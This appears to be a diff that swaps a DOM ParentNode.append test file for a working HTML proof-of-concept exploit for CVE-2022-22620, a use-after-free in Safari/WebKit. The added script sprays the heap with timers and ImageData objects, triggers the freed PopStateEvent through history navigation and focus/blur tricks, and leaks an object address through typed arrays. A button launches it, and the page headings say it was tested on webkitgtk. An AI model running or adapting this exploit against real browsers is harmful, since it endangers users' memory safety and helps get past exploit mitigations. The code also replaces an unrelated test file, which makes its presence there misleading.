@@ -1,77 +1,82 @@
 <!DOCTYPE html>
-<meta charset=utf-8>
-<title>ParentNode.append</title>
-<link rel=help href="https://dom.spec.whatwg.org/#dom-parentnode-append">
-<script src="/resources/testharness.js"></script>
-<script src="/resources/testharnessreport.js"></script>
-<script src="pre-insertion-validation-hierarchy.js"></script>
+<html>
+
 <script>
-preInsertionValidateHierarchy("append");
+x = [1.1];
 
-function test_append(node, nodeName) {
-    test(function() {
-        const parent = node.cloneNode();
-        parent.append();
-        assert_array_equals(parent.childNodes, []);
-    }, nodeName + '.append() without any argument, on a parent having no child.');
 
-    test(function() {
-        const parent = node.cloneNode();
-        parent.append(null);
-        assert_equals(parent.childNodes[0].textContent, 'null');
-    }, nodeName + '.append() with null as an argument, on a parent having no child.');
+var buffer      = new ArrayBuffer(8);
+var byteView    = new Uint8Array(buffer);
+var uint32View  = new Uint32Array(buffer);
+var float64View = new Float64Array(buffer);
 
-    test(function() {
-        const parent = node.cloneNode();
-        parent.append(undefined);
-        assert_equals(parent.childNodes[0].textContent, 'undefined');
-    }, nodeName + '.append() with undefined as an argument, on a parent having no child.');
 
-    test(function() {
-        const parent = node.cloneNode();
-        parent.append('text');
-        assert_equals(parent.childNodes[0].textContent, 'text');
-    }, nodeName + '.append() with only text as an argument, on a parent having no child.');
+function myfunc3(leaked,b,c,d,e,f,g,h,i,j,k,l)
+{
+if( leaked!=x) {
 
-    test(function() {
-        const parent = node.cloneNode();
-        const x = document.createElement('x');
-        parent.append(x);
-        assert_array_equals(parent.childNodes, [x]);
-    }, nodeName + '.append() with only one element as an argument, on a parent having no child.');
+float64View[0] = leaked;
 
-    test(function() {
-        const parent = node.cloneNode();
-        const child = document.createElement('test');
-        parent.appendChild(child);
-        parent.append(null);
-        assert_equals(parent.childNodes[0], child);
-        assert_equals(parent.childNodes[1].textContent, 'null');
-    }, nodeName + '.append() with null as an argument, on a parent having a child.');
+alert("Leaked object: 0x"+ (uint32View[1]|0x20000).toString(16)  + (uint32View[0]>>8).toString(16) );
 
-    test(function() {
-        const parent = node.cloneNode();
-        const x = document.createElement('x');
-        const child = document.createElement('test');
-        parent.appendChild(child);
-        parent.append(x, 'text');
-        assert_equals(parent.childNodes[0], child);
-        assert_equals(parent.childNodes[1], x);
-        assert_equals(parent.childNodes[2].textContent, 'text');
-    }, nodeName + '.append() with one element and text as argument, on a parent having a child.');
-
-    test(function() {
-        const parent = node.cloneNode();
-        const x = document.createElement('x');
-        const y = document.createElement('y');
-        parent.append(x, y, x);
-        assert_equals(parent.childNodes.length, 2);
-        assert_equals(parent.childNodes[0], y);
-        assert_equals(parent.childNodes[1], x);
-    }, nodeName + '.append() with the same element twice.');
 }
+//console.log(arguments);
+}                
 
-test_append(document.createElement('div'), 'Element');
-test_append(document.createDocumentFragment(), 'DocumentFragment');
-</script>
-</html>
+function myfunc(a,b,c,d,e,f,g,h,i,j,k,l)
+{
+}        
+
+
+
+function test_poc_safari()
+    {
+
+        window.addEventListener('popstate', (event) => { 
+
+        event = null;
+        for(i=0; i<15750; i++) setTimeout(myfunc3,15000,x,0x61,2,3,4,5,6,7,8,9,10,11);
+        setInterval( ()=> {         for(i=0; i<200750; i++) new ImageData(1,96/4);         } , 1500);                                // trigger PopStateEvent::~PopStateEvent and dec the refcount         
+        });
+
+
+                input = document.body.appendChild(document.createElement("input"));
+
+                                foo = document.body.appendChild(document.createElement("a"));
+                                foo.id = "foo";
+
+                                for(i=0; i<1000; i++)        setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+
+                                history.pushState("", "", location + "#foo");
+                                for(i=0; i<1000; i++)        setTimeout(myfunc,0,0x61,0x61,0,4,5,6,7,8,9,10,11,12);
+                                //Current state = state2
+
+                                history.pushState("", "");
+
+                                setTimeout(() => {
+
+                                                // Set the focus on the input element.
+                                                // During the call to back() the focus will change to the foo element 
+                                                // and therefore triggering the blur event on the input element
+                                                input.focus(); 
+
+                                                input.onblur = () => {history.replaceState("", "");  
+
+                                                 }
+                                                setTimeout(() => { history.back();   }, 500);                }, 500);
+
+
+        }
+     </script>
+    <head>
+     </head>
+     <body>
+        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
+        <h1>info leak exploit: Tested on webkitgtk-2.34.3 (UBUNTU64) </h1>
+
+        <h1>Based on Google Project Zero <a href=https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html> POC</a></h1>
+        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
+     </body>
+
+
+   </html>
